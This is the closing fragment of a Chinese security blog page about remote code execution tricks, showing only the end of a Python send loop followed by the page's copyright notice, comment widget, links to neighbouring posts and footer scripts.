e:</span><br><span class="line">        print(f&quot;[-] Failed to send &#123;line&#125;: &#123;e&#125;&quot;)</span><br><span class="line">    time.sleep(0.5)  # 建议加间隔，避免过快触发异常</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">JGwebre</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://heisha123.github.io/2025/07/23/rce%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/">https://heisha123.github.io/2025/07/23/rce的一些奇技淫巧/</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本站点所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://heisha123.github.io">JG的个人博客</a>！</span></div></div><div class="post-copyright valine" id="comments-container"><script src="//unpkg.com/valine@1.4.14/dist/Valine.min.js"></script><script>let arr = location.href.split('/#more')[0].split('/');
+let title = arr[arr.length - 1];
+if (title === '') {
+    title = arr[arr.length - 2];
+}
+var flag = false;
+var gitFun = function () {
+    try {
+        var valineObj = window.GLOBAL_CONFIG.valine;
+        new Valine({
+            el: "#comments-container",
+            ...valineObj
+        });
+        flag = true;
+    } catch (e) {
+        flag = false;
+    }
+}
+var setIn = setInterval(() => {
+    if (!flag) {
+        gitFun();
+    } else {
+        clearInterval(setIn);
+    }
+}, 200);</script></div></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/25/cacti-CVE-2022-46169/"><i class="fas fa-angle-left">&nbsp;</i><span>cacti CVE-2022-46169</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/2025/07/22/RCE-5%E9%81%93%E6%8C%91%E6%88%98%E9%A2%98/"><span>RCE 5道挑战题</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2025 By JGwebre</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>
